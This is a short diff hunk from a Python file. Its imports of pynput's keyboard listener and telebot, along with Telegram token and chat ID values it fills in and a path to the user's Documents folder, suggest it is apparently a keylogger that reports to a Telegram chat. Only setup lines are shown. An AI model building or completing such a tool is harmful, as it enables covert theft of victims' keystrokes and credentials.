@@ -5,8 +5,8 @@ from datetime import datetime
 import telebot
 from pynput import keyboard
 
-token = ''
-chatID = ''
+token = '152512'
+chatID = '152512'
 mainstr = ''
 path = f'C:/Users/{getpass.getuser()}/Documents'
 
